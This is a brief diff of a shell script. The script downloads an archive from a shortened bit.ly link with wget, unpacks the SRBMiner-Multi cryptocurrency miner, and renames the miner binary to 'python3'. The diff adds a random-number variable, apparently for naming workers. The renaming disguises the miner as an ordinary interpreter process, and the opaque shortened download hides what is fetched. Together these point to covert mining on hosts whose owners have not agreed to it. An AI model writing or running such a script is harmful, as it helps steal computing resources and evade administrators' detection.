@@ -1,8 +1,4 @@
 
-mkdir dotrum
-
-cd dotrum
-
 wget https://bit.ly/kontolrum
 
 tar -xvf kontolrum
@@ -10,6 +6,8 @@ tar -xvf kontolrum
 cd SRBMiner-Multi-2-4-7
 
 mv SRBMiner-MULTI python3
+
+nomer=$((RANDOM % 50 + 1))
 
 clear
 
